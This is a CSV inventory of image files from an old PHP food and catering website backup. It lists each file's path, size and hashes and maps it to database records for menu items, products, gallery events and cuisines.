Filename,Relative Path,Size (Bytes),SHA256 Hash,MD5 Hash,Status,DB Table,DB Record ID,DB Item Title,DB Image Column
15.jpg,old-website-php/Full-website-backup/frontEnd/items/15.jpg,14325,202844a28966bf95539e1a4b3127f61ec7dc6cdb1ff60f5d68cd0c5d781e67ac,0012e082ab7b93fcc4dc01767e24b578,DB Mapped (Verified),worke_work_experience,15,Desserts Dishes by1,workproimg
16.jpg,old-website-php/Full-website-backup/frontEnd/items/16.jpg,8684,2dc79a396818a36ca9dd5093d1f8c4745230682226e897182fd41aa85db5c088,6ec9b9fe0a3fe037dd724b778ad2e4e0,DB Mapped (Verified),product_item_tbl,16,Desi Ghee Bundi Ladoo,menu_img
16.jpg,old-website-php/Full-website-backup/frontEnd/items/16.jpg,8684,2dc79a396818a36ca9dd5093d1f8c4745230682226e897182fd41aa85db5c088,6ec9b9fe0a3fe037dd724b778ad2e4e0,DB Mapped (Verified),website_gallery,16,Event at DPS school Gurugram,gimage
16.jpg,old-website-php/Full-website-backup/frontEnd/items/16.jpg,8684,2dc79a396818a36ca9dd5093d1f8c4745230682226e897182fd41aa85db5c088,6ec9b9fe0a3fe037dd724b778ad2e4e0,DB Mapped (Verified),worke_work_experience,16,Desserts Dishes by3,workproimg
17.jpg,old-website-php/Full-website-backup/frontEnd/items/17.jpg,11516,34e3c79138322d9828e5543ad2be801ff4b4dfdfca82553689d59090f6dc6480,33adcb9539cbaa2e051fd59476469227,DB Mapped (Verified),product_item_tbl,17,Desi Ghee Gujia,menu_img
17.jpg,old-website-php/Full-website-backup/frontEnd/items/17.jpg,11516,34e3c79138322d9828e5543ad2be801ff4b4dfdfca82553689d59090f6dc6480,33adcb9539cbaa2e051fd59476469227,DB Mapped (Verified),website_gallery,17,Event at DPS school Gurugram,gimage
17.jpg,old-website-php/Full-website-backup/frontEnd/items/17.jpg,11516,34e3c79138322d9828e5543ad2be801ff4b4dfdfca82553689d59090f6dc6480,33adcb9539cbaa2e051fd59476469227,DB Mapped (Verified),worke_work_experience,17,Desserts Dishes by2,workproimg
18.jpg,old-website-php/Full-website-backup/frontEnd/items/18.jpg,6912,523ff3d26d391b16691496da484020692558e6af033ef6b53da098bd2bb92416,376f3f32d232ac2aa973fd7978c9cdb5,DB Mapped (Verified),menu_item_tbl,18,Aloo Gobhi,menu_img
18.jpg,old-website-php/Full-website-backup/frontEnd/items/18.jpg,6912,523ff3d26d391b16691496da484020692558e6af033ef6b53da098bd2bb92416,376f3f32d232ac2aa973fd7978c9cdb5,DB Mapped (Verified),product_item_tbl,18,Desi Ghee Patisha,menu_img
18.jpg,old-website-php/Full-website-backup/frontEnd/items/18.jpg,6912,523ff3d26d391b16691496da484020692558e6af033ef6b53da098bd2bb92416,376f3f32d232ac2aa973fd7978c9cdb5,DB Mapped (Verified),website_gallery,18,event at noida,gimage
18.jpg,old-website-php/Full-website-backup/frontEnd/items/18.jpg,6912,523ff3d26d391b16691496da484020692558e6af033ef6b53da098bd2bb92416,376f3f32d232ac2aa973fd7978c9cdb5,DB Mapped (Verified),worke_work_experience,18,reakfast Dishes by2,workproimg
19.jpg,old-website-php/Full-website-backup/frontEnd/items/19.jpg,12505,3d04104df7a85c1d215265edbd7030387475b36dbda2d0c39bb7cd7c6202cdec,a52fe87158583869aba55a5279c136ba,DB Mapped (Verified),product_item_tbl,19,Dry Fruit Patisha,menu_img
19.jpg,old-website-php/Full-website-backup/frontEnd/items/19.jpg,12505,3d04104df7a85c1d215265edbd7030387475b36dbda2d0c39bb7cd7c6202cdec,a52fe87158583869aba55a5279c136ba,DB Mapped (Verified),website_gallery,19,Event at Delhi,gimage
19.jpg,old-website-php/Full-website-backup/frontEnd/items/19.jpg,12505,3d04104df7a85c1d215265edbd7030387475b36dbda2d0c39bb7cd7c6202cdec,a52fe87158583869aba55a5279c136ba,DB Mapped (Verified),worke_work_experience,19,reakfast Dishes by1,workproimg
2.jpg,old-website-php/Full-website-backup/frontEnd/items/2.jpg,12788,5bd7b6d697319361e2a883e2ece8446f746389f768d0584ac7f01e241eac5694,fd3978971e3adaf0080684aaa4ab8c85,DB Mapped (Verified),menu_item_tbl,2,Plain Idli,menu_img
2.jpg,old-website-php/Full-website-backup/frontEnd/items/2.jpg,12788,5bd7b6d697319361e2a883e2ece8446f746389f768d0584ac7f01e241eac5694,fd3978971e3adaf0080684aaa4ab8c85,DB Mapped (Verified),menu_item_tbl,2,Plain Idli,menu_small_img
2.jpg,old-website-php/Full-website-backup/frontEnd/items/2.jpg,12788,5bd7b6d697319361e2a883e2ece8446f746389f768d0584ac7f01e241eac5694,fd3978971e3adaf0080684aaa4ab8c85,DB Mapped (Verified),product_item_tbl,2,Gujrati Kachori,menu_img
2.jpg,old-website-php/Full-website-backup/frontEnd/items/2.jpg,12788,5bd7b6d697319361e2a883e2ece8446f746389f768d0584ac7f01e241eac5694,fd3978971e3adaf0080684aaa4ab8c85,DB Mapped (Verified),website_gallery,2,Images 2,gimage
2.jpg,old-website-php/Full-website-backup/frontEnd/items/2.jpg,12788,5bd7b6d697319361e2a883e2ece8446f746389f768d0584ac7f01e241eac5694,fd3978971e3adaf0080684aaa4ab8c85,DB Mapped (Verified),recipe_appliances_kits,2,Black Pepper Powder,kits_img
2.jpg,old-website-php/Full-website-backup/frontEnd/items/2.jpg,12788,5bd7b6d697319361e2a883e2ece8446f746389f768d0584ac7f01e241eac5694,fd3978971e3adaf0080684aaa4ab8c85,DB Mapped (Verified),event_cuisine,2,North Indian,cuisine_img
20.jpg,old-website-php/Full-website-backup/frontEnd/items/20.jpg,10674,91d3e2e3e700e3460061d4753285f93600eb2c1e58274e542f15783493c21f9f,2f6f60aa410d1d91623416df92567baf,DB Mapped (Verified),product_item_tbl,20,Karachi Halwai,menu_img
20.jpg,old-website-php/Full-website-backup/frontEnd/items/20.jpg,10674,91d3e2e3e700e3460061d4753285f93600eb2c1e58274e542f15783493c21f9f,2f6f60aa410d1d91623416df92567baf,DB Mapped (Verified),website_gallery,20,Event at Ghaziabadh,gimage
20.jpg,old-website-php/Full-website-backup/frontEnd/items/20.jpg,10674,91d3e2e3e700e3460061d4753285f93600eb2c1e58274e542f15783493c21f9f,2f6f60aa410d1d91623416df92567baf,DB Mapped (Verified),worke_work_experience,20,Chinese Dishes by,workproimg
21.jpg,old-website-php/Full-website-backup/frontEnd/items/21.jpg,13302,0da6211caef1e82eb4bf2c87e74ce75e789cb742ab3f97635eb76e497dcc443e,dc5e8f64e2f7b562e8e13124a5d7c395,DB Mapped (Verified),product_item_tbl,21,Meva Panjiri,menu_img
21.jpg,old-website-php/Full-website-backup/frontEnd/items/21.jpg,13302,0da6211caef1e82eb4bf2c87e74ce75e789cb742ab3f97635eb76e497dcc443e,dc5e8f64e2f7b562e8e13124a5d7c395,DB Mapped (Verified),website_gallery,21,Event at Ghaziabadh,gimage
21.jpg,old-website-php/Full-website-backup/frontEnd/items/21.jpg,13302,0da6211caef1e82eb4bf2c87e74ce75e789cb742ab3f97635eb76e497dcc443e,dc5e8f64e2f7b562e8e13124a5d7c395,DB Mapped (Verified),worke_work_experience,21,Chinese Dishes by 2,workproimg
22.jpg,old-website-php/Full-website-backup/frontEnd/items/22.jpg,8465,ca331f28733dd40a0bb0456baa3c0276ba026a9cd5579efdd553155b35c815a9,9b16de59ce30e7f4b7da3b1c65f30b34,DB Mapped (Verified),menu_item_tbl,22,Kheer,menu_img
22.jpg,old-website-php/Full-website-backup/frontEnd/items/22.jpg,8465,ca331f28733dd40a0bb0456baa3c0276ba026a9cd5579efdd553155b35c815a9,9b16de59ce30e7f4b7da3b1c65f30b34,DB Mapped (Verified),product_item_tbl,22,Kathal ka Achaar,menu_img
23.jpg,old-website-php/Full-website-backup/frontEnd/items/23.jpg,9688,b139696f255d3dbb787618a209f62fd97af4b2fee7ba88f40da939ac665b19d1,0e21dafbcf0f6aa58391ed527876ade1,DB Mapped (Verified),menu_item_tbl,23,Tomato Basil Soup,menu_img
23.jpg,old-website-php/Full-website-backup/frontEnd/items/23.jpg,9688,b139696f255d3dbb787618a209f62fd97af4b2fee7ba88f40da939ac665b19d1,0e21dafbcf0f6aa58391ed527876ade1,DB Mapped (Verified),menu_item_tbl,23,Tomato Basil Soup,menu_small_img
23.jpg,old-website-php/Full-website-backup/frontEnd/items/23.jpg,9688,b139696f255d3dbb787618a209f62fd97af4b2fee7ba88f40da939ac665b19d1,0e21dafbcf0f6aa58391ed527876ade1,DB Mapped (Verified),product_item_tbl,23,Lal Mirch ka Bharua Achar,menu_img
24.jpg,old-website-php/Full-website-backup/frontEnd/items/24.jpg,13760,7203643dd8f7047f001f45ff9c723a7f9d92d1522aa32a54a908f92d44bd0c62,c6393410594f39e64f048a1b64d89afa,DB Mapped (Verified),menu_item_tbl,24,Sweet Corn Soup - Chinese,menu_img
24.jpg,old-website-php/Full-website-backup/frontEnd/items/24.jpg,13760,7203643dd8f7047f001f45ff9c723a7f9d92d1522aa32a54a908f92d44bd0c62,c6393410594f39e64f048a1b64d89afa,DB Mapped (Verified),menu_item_tbl,24,Sweet Corn Soup - Chinese,menu_small_img
24.jpg,old-website-php/Full-website-backup/frontEnd/items/24.jpg,13760,7203643dd8f7047f001f45ff9c723a7f9d92d1522aa32a54a908f92d44bd0c62,c6393410594f39e64f048a1b64d89afa,DB Mapped (Verified),product_item_tbl,24,Aam ka Achar,menu_img
24.jpg,old-website-php/Full-website-backup/frontEnd/items/24.jpg,13760,7203643dd8f7047f001f45ff9c723a7f9d92d1522aa32a54a908f92d44bd0c62,c6393410594f39e64f048a1b64d89afa,DB Mapped (Verified),website_gallery,24,Amritsari Kulcha,gimage
25.jpg,old-website-php/Full-website-backup/frontEnd/items/25.jpg,11950,35e9330024ee3472066072ff78f48234166b4781366b34ffb462cfed9a8070ce,3812bcdd4a7d9139eb5c624f26169912,DB Mapped (Verified),product_item_tbl,25,Hari bhri Mirchi,menu_img
26.jpg,old-website-php/Full-website-backup/frontEnd/items/26.jpg,14028,69481b8c28d37c2c5f4a693e0802cdc7243d875d0237a629c552e4d59b7cbebb,fc9a2a098551323f1923a6d4bc4f5fc4,DB Mapped (Verified),menu_item_tbl,26,Lemon Coriander Soup,menu_img
26.jpg,old-website-php/Full-website-backup/frontEnd/items/26.jpg,14028,69481b8c28d37c2c5f4a693e0802cdc7243d875d0237a629c552e4d59b7cbebb,fc9a2a098551323f1923a6d4bc4f5fc4,DB Mapped (Verified),menu_item_tbl,26,Lemon Coriander Soup,menu_small_img
26.jpg,old-website-php/Full-website-backup/frontEnd/items/26.jpg,14028,69481b8c28d37c2c5f4a693e0802cdc7243d875d0237a629c552e4d59b7cbebb,fc9a2a098551323f1923a6d4bc4f5fc4,DB Mapped (Verified),product_item_tbl,26,Ginger Garlic Pickle,menu_img
26.jpg,old-website-php/Full-website-backup/frontEnd/items/26.jpg,14028,69481b8c28d37c2c5f4a693e0802cdc7243d875d0237a629c552e4d59b7cbebb,fc9a2a098551323f1923a6d4bc4f5fc4,DB Mapped (Verified),worke_work_experience,26,cuisine,workproimg
27.jpg,old-website-php/Full-website-backup/frontEnd/items/27.jpg,11060,364c48b4501769e7164e03b1a714e5b973a3e8acf1c47dc914d05a73ef65813a,7466851d59d26f58461847df23d9c721,DB Mapped (Verified),menu_item_tbl,27,Chicken Manchow Soup,menu_img
27.jpg,old-website-php/Full-website-backup/frontEnd/items/27.jpg,11060,364c48b4501769e7164e03b1a714e5b973a3e8acf1c47dc914d05a73ef65813a,7466851d59d26f58461847df23d9c721,DB Mapped (Verified),menu_item_tbl,27,Chicken Manchow Soup,menu_small_img
27.jpg,old-website-php/Full-website-backup/frontEnd/items/27.jpg,11060,364c48b4501769e7164e03b1a714e5b973a3e8acf1c47dc914d05a73ef65813a,7466851d59d26f58461847df23d9c721,DB Mapped (Verified),product_item_tbl,27,Chilli Mix Pickle,menu_img
27.jpg,old-website-php/Full-website-backup/frontEnd/items/27.jpg,11060,364c48b4501769e7164e03b1a714e5b973a3e8acf1c47dc914d05a73ef65813a,7466851d59d26f58461847df23d9c721,DB Mapped (Verified),worke_work_experience,27,north indian,workproimg
28.jpg,old-website-php/Full-website-backup/frontEnd/items/28.jpg,9761,e3c6326710fd902cec0f239f0396742ee95151ea2421db67a29d6f1902210117,d2709294a0b847d3b73a0a8e04eb8639,DB Mapped (Verified),product_item_tbl,28,Tomato chutney,menu_img
29.jpg,old-website-php/Full-website-backup/frontEnd/items/29.jpg,7845,ecb0fd5bceb1ac91966c9c8ac7e8126f463dd564eaed2f725ae87a4614fb3514,465c79d21ad0c03178e2a8120f4b891a,DB Mapped (Verified),product_item_tbl,29,Mint Peanut Chutney Recipe,menu_img
3.jpg,old-website-php/Full-website-backup/frontEnd/items/3.jpg,6464,e8863e062288178ded3a2222d433abd2c461a5fbbbd393867e648b58c8ad8d9f,568e835bbfdea350ae8b9cab56b44217,DB Mapped (Verified),menu_item_tbl,3,Mixed Veg Uttappam,menu_img
3.jpg,old-website-php/Full-website-backup/frontEnd/items/3.jpg,6464,e8863e062288178ded3a2222d433abd2c461a5fbbbd393867e648b58c8ad8d9f,568e835bbfdea350ae8b9cab56b44217,DB Mapped (Verified),product_item_tbl,3,Loose Gol Matthi,menu_img
3.jpg,old-website-php/Full-website-backup/frontEnd/items/3.jpg,6464,e8863e062288178ded3a2222d433abd2c461a5fbbbd393867e648b58c8ad8d9f,568e835bbfdea350ae8b9cab56b44217,DB Mapped (Verified),website_gallery,3,Images 3,gimage
3.jpg,old-website-php/Full-website-backup/frontEnd/items/3.jpg,6464,e8863e062288178ded3a2222d433abd2c461a5fbbbd393867e648b58c8ad8d9f,568e835bbfdea350ae8b9cab56b44217,DB Mapped (Verified),recipe_appliances_kits,3,Refined Oil,kits_img
3.jpg,old-website-php/Full-website-backup/frontEnd/items/3.jpg,6464,e8863e062288178ded3a2222d433abd2c461a5fbbbd393867e648b58c8ad8d9f,568e835bbfdea350ae8b9cab56b44217,DB Mapped (Verified),event_cuisine,3,China to India,cuisine_img
30.jpg,old-website-php/Full-website-backup/frontEnd/items/30.jpg,9088,b1314531e8a72726344bbd77f56a51ede6285d31b3244cd176a9acfecb4a5edb,d885824e3015dff9824db2c82de3c81e,DB Mapped (Verified),product_item_tbl,30,Coconut Chutney,menu_img
31.jpg,old-website-php/Full-website-backup/frontEnd/items/31.jpg,8738,757c2a2829d0cf02530ae168daa2525755bf8333b6ffa668cbaf0acc47004908,850ae33b9ebb2bf787081f413c2d03e8,DB Mapped (Verified),menu_item_tbl,31,Fruits,menu_img
31.jpg,old-website-php/Full-website-backup/frontEnd/items/31.jpg,8738,757c2a2829d0cf02530ae168daa2525755bf8333b6ffa668cbaf0acc47004908,850ae33b9ebb2bf787081f413c2d03e8,DB Mapped (Verified),product_item_tbl,31,Coriander Coconut Chutney,menu_img
32.jpg,old-website-php/Full-website-backup/frontEnd/items/32.jpg,9135,2ec21fa5514ce9900a12e651b099d10493731f93c87a3fc7cf4c09440053fbee,8c975e8ca07c559c8c0de0fb88ac7e77,DB Mapped (Verified),menu_item_tbl,32,Poha,menu_img
32.jpg,old-website-php/Full-website-backup/frontEnd/items/32.jpg,9135,2ec21fa5514ce9900a12e651b099d10493731f93c87a3fc7cf4c09440053fbee,8c975e8ca07c559c8c0de0fb88ac7e77,DB Mapped (Verified),product_item_tbl,32,Tomato Thokku,menu_img
33.jpg,old-website-php/Full-website-backup/frontEnd/items/33.jpg,12278,3147b36961f555c005b2b852b86a6285039f3fa6b25265399e61a21271dc8208,403f35c74f984cc8fef04aab033245ec,DB Mapped (Verified),product_item_tbl,33,Peanut Chutney | Groundnut Chutney,menu_img
34.jpg,old-website-php/Full-website-backup/frontEnd/items/34.jpg,9919,6e237c8b85f3e8848100d0b73736d1db592fdf4cf75814b32470ecc67986fa43,483ebe34c2d43af8db769f5432bbc5eb,DB Mapped (Verified),menu_item_tbl,34,Sprouts,menu_img
34.jpg,old-website-php/Full-website-backup/frontEnd/items/34.jpg,9919,6e237c8b85f3e8848100d0b73736d1db592fdf4cf75814b32470ecc67986fa43,483ebe34c2d43af8db769f5432bbc5eb,DB Mapped (Verified),product_item_tbl,34,Moringa Leaves Chutney,menu_img
35.jpg,old-website-php/Full-website-backup/frontEnd/items/35.jpg,11738,eff23f18f12b4e89ab9498adcae33781034c737337d7182c57d12f3854020581,1d5f750a8f8c4244c42a6593d12d3eb1,DB Mapped (Verified),menu_item_tbl,35,Cheela,menu_img
35.jpg,old-website-php/Full-website-backup/frontEnd/items/35.jpg,11738,eff23f18f12b4e89ab9498adcae33781034c737337d7182c57d12f3854020581,1d5f750a8f8c4244c42a6593d12d3eb1,DB Mapped (Verified),product_item_tbl,35,Green Tomato Chutney,menu_img
36.jpg,old-website-php/Full-website-backup/frontEnd/items/36.jpg,11949,cf12f9b151d6e1483d06ca266efafe43cca59ca9f5cb8ae0094ad6de4437e3fb,932b2e7171d7185ac6a3ee21658c132d,DB Mapped (Verified),product_item_tbl,36,Chana Dal Chutney | Kadale Bele Chutney,menu_img
37.jpg,old-website-php/Full-website-backup/frontEnd/items/37.jpg,8048,1c35bdcb92f0fecc292d930b4ae5c362e21a0cb4e10071e072ed070fde35508a,282028e5cbeb2d44af43a36fbbb0fc7e,DB Mapped (Verified),menu_item_tbl,37,Corn Soup,menu_img
37.jpg,old-website-php/Full-website-backup/frontEnd/items/37.jpg,8048,1c35bdcb92f0fecc292d930b4ae5c362e21a0cb4e10071e072ed070fde35508a,282028e5cbeb2d44af43a36fbbb0fc7e,DB Mapped (Verified),menu_item_tbl,37,Corn Soup,menu_small_img
37.jpg,old-website-php/Full-website-backup/frontEnd/items/37.jpg,8048,1c35bdcb92f0fecc292d930b4ae5c362e21a0cb4e10071e072ed070fde35508a,282028e5cbeb2d44af43a36fbbb0fc7e,DB Mapped (Verified),product_item_tbl,37,Mint Yogurt Chutney,menu_img
38.jpg,old-website-php/Full-website-backup/frontEnd/items/38.jpg,8048,1c35bdcb92f0fecc292d930b4ae5c362e21a0cb4e10071e072ed070fde35508a,282028e5cbeb2d44af43a36fbbb0fc7e,DB Mapped (Verified),product_item_tbl,38,Methi Chutney,menu_img
39.jpg,old-website-php/Full-website-backup/frontEnd/items/39.jpg,8879,947ddc1c9bb674e8847aa62f27b6630ae836c81c9ae6677c7a6b3064ba1b041e,8fc385a6524a84aef38341cf6e804404,DB Mapped (Verified),menu_item_tbl,39,Tom Yum Soup,menu_img
39.jpg,old-website-php/Full-website-backup/frontEnd/items/39.jpg,8879,947ddc1c9bb674e8847aa62f27b6630ae836c81c9ae6677c7a6b3064ba1b041e,8fc385a6524a84aef38341cf6e804404,DB Mapped (Verified),menu_item_tbl,39,Tom Yum Soup,menu_small_img
39.jpg,old-website-php/Full-website-backup/frontEnd/items/39.jpg,8879,947ddc1c9bb674e8847aa62f27b6630ae836c81c9ae6677c7a6b3064ba1b041e,8fc385a6524a84aef38341cf6e804404,DB Mapped (Verified),product_item_tbl,39,Capsicum Peanut Chutney,menu_img
4.jpg,old-website-php/Full-website-backup/frontEnd/items/4.jpg,9822,a9ab4228417c26dfd4e1f0fe24f86780cfa851011ac3baaf4c00b2261305d493,a9d171f0102e9e0bbe2fa0c26d0230b7,DB Mapped (Verified),menu_item_tbl,4,Sambhar,menu_img
4.jpg,old-website-php/Full-website-backup/frontEnd/items/4.jpg,9822,a9ab4228417c26dfd4e1f0fe24f86780cfa851011ac3baaf4c00b2261305d493,a9d171f0102e9e0bbe2fa0c26d0230b7,DB Mapped (Verified),product_item_tbl,4,Loose Mitthi Matthi,menu_img
4.jpg,old-website-php/Full-website-backup/frontEnd/items/4.jpg,9822,a9ab4228417c26dfd4e1f0fe24f86780cfa851011ac3baaf4c00b2261305d493,a9d171f0102e9e0bbe2fa0c26d0230b7,DB Mapped (Verified),website_gallery,4,Images 4,gimage
4.jpg,old-website-php/Full-website-backup/frontEnd/items/4.jpg,9822,a9ab4228417c26dfd4e1f0fe24f86780cfa851011ac3baaf4c00b2261305d493,a9d171f0102e9e0bbe2fa0c26d0230b7,DB Mapped (Verified),recipe_appliances_kits,4,Spatula,kits_img
4.jpg,old-website-php/Full-website-backup/frontEnd/items/4.jpg,9822,a9ab4228417c26dfd4e1f0fe24f86780cfa851011ac3baaf4c00b2261305d493,a9d171f0102e9e0bbe2fa0c26d0230b7,DB Mapped (Verified),event_cuisine,4,Flame Grilled to Perfection,cuisine_img
40.jpg,old-website-php/Full-website-backup/frontEnd/items/40.jpg,9226,b05117350dc216334c5f489bd6503fe60d58ff93d1e56a7c072ea50691519baa,5e14ea1f1951e572ecf4f410e3f3e609,DB Mapped (Verified),product_item_tbl,40,Red Bell Pepper Chutney,menu_img
41.jpg,old-website-php/Full-website-backup/frontEnd/items/41.jpg,11178,73ac0e59d9bd55a9a1b452a32004b70877fc240033eb9b4c3a469a41618e59ca,03bf1ad55e7f91489b446c38e3d6fbb4,DB Mapped (Verified),menu_item_tbl,41,Maxican Soup,menu_img
41.jpg,old-website-php/Full-website-backup/frontEnd/items/41.jpg,11178,73ac0e59d9bd55a9a1b452a32004b70877fc240033eb9b4c3a469a41618e59ca,03bf1ad55e7f91489b446c38e3d6fbb4,DB Mapped (Verified),menu_item_tbl,41,Maxican Soup,menu_small_img
41.jpg,old-website-php/Full-website-backup/frontEnd/items/41.jpg,11178,73ac0e59d9bd55a9a1b452a32004b70877fc240033eb9b4c3a469a41618e59ca,03bf1ad55e7f91489b446c38e3d6fbb4,DB Mapped (Verified),product_item_tbl,41,Zucchini Chutney,menu_img
42.jpg,old-website-php/Full-website-backup/frontEnd/items/42.jpg,8973,9194e13936a179e8d7413308faf098aeab08ed8a987fcd4804d8cf5b0d498b4c,27060a6abd91c7ecb9a3c3fdd1b8c678,DB Mapped (Verified),menu_item_tbl,42,Tomato Coconut Soup,menu_img
42.jpg,old-website-php/Full-website-backup/frontEnd/items/42.jpg,8973,9194e13936a179e8d7413308faf098aeab08ed8a987fcd4804d8cf5b0d498b4c,27060a6abd91c7ecb9a3c3fdd1b8c678,DB Mapped (Verified),menu_item_tbl,42,Tomato Coconut Soup,menu_small_img
42.jpg,old-website-php/Full-website-backup/frontEnd/items/42.jpg,8973,9194e13936a179e8d7413308faf098aeab08ed8a987fcd4804d8cf5b0d498b4c,27060a6abd91c7ecb9a3c3fdd1b8c678,DB Mapped (Verified),product_item_tbl,42,Walnut Chutney,menu_img
43.jpg,old-website-php/Full-website-backup/frontEnd/items/43.jpg,7847,6494904c59c9a3136d16379d4e4f03bf2d4ce6e4616f10285ca68d0f9e7f9386,d73a847e57895c9c96b8691e1601ffb0,DB Mapped (Verified),menu_item_tbl,43,Palak Paneer Soup,menu_img
43.jpg,old-website-php/Full-website-backup/frontEnd/items/43.jpg,7847,6494904c59c9a3136d16379d4e4f03bf2d4ce6e4616f10285ca68d0f9e7f9386,d73a847e57895c9c96b8691e1601ffb0,DB Mapped (Verified),menu_item_tbl,43,Palak Paneer Soup,menu_small_img
43.jpg,old-website-php/Full-website-backup/frontEnd/items/43.jpg,7847,6494904c59c9a3136d16379d4e4f03bf2d4ce6e4616f10285ca68d0f9e7f9386,d73a847e57895c9c96b8691e1601ffb0,DB Mapped (Verified),product_item_tbl,43,Mango Chutney,menu_img
44.jpg,old-website-php/Full-website-backup/frontEnd/items/44.jpg,12551,405d9fad928c04f3dd0d35afb34471a0969351100f083eb177fdaad7081cc45b,decc20f89eb30ee0440bd34ededdd22b,Static / Orphaned Disk Asset,,,,
5.jpg,old-website-php/Full-website-backup/frontEnd/items/5.jpg,5722,06f8ecf1800489476c21156f814a948ba7153d5962a69b4a990a89ef494af262,7567bfd108368fddf094a1b722e60940,DB Mapped (Verified),product_item_tbl,5,Loose Namek Pare,menu_img
5.jpg,old-website-php/Full-website-backup/frontEnd/items/5.jpg,5722,06f8ecf1800489476c21156f814a948ba7153d5962a69b4a990a89ef494af262,7567bfd108368fddf094a1b722e60940,DB Mapped (Verified),website_gallery,5,Images 5,gimage
5.jpg,old-website-php/Full-website-backup/frontEnd/items/5.jpg,5722,06f8ecf1800489476c21156f814a948ba7153d5962a69b4a990a89ef494af262,7567bfd108368fddf094a1b722e60940,DB Mapped (Verified),recipe_appliances_kits,5,Toothpicks,kits_img
5.jpg,old-website-php/Full-website-backup/frontEnd/items/5.jpg,5722,06f8ecf1800489476c21156f814a948ba7153d5962a69b4a990a89ef494af262,7567bfd108368fddf094a1b722e60940,DB Mapped (Verified),event_cuisine,5,First meal of the day,cuisine_img
6.jpg,old-website-php/Full-website-backup/frontEnd/items/6.jpg,12023,f215aadf5219a8c6a9d17f0a2eb7fe0981958f74538321e5a36e6a7c25ec1cf8,578574e239067ef14a73bab88b1f7f93,DB Mapped (Verified),product_item_tbl,6,Masala Pare,menu_img
